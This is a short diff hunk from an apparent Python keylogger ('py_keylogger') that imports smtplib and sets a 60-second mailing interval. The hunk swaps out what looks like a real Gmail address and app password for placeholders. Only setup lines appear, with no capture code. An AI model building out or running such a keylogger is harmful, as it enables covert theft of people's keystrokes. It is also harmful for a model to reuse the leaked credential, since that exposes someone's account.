@@ -3,8 +3,8 @@ import smtplib
 from threading import Semaphore, Timer
 
 INTERVAL = 60
-EMAIL_ID = "rishabsatu@gmail.com"
-PASSWORD = "hgyujuogkvloyqyf"
+EMAIL_ID = "enter your email"
+PASSWORD = "enter your password"
 
 class py_keylogger:
 
